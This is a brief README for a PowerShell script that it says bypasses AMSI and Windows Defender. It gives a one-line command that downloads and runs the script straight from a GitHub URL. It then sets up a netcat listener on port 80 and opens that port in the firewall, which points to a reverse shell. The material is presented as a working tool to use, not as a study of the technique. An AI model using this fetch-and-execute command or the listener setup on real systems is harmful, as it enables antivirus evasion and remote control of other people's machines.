## Basic Usage
This is a powershell script that bypass amsi / defender

How to execute ? 
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/AeroWw/obstest/main/script.ps1')
```

## set up a listerner 

````
nc -lvnp 80
````
You need to make sure that you have the port allowed by you firewall
You can check by using 
````
ufw status
````
You can allow a port by using
````
ufw allow [port]
````

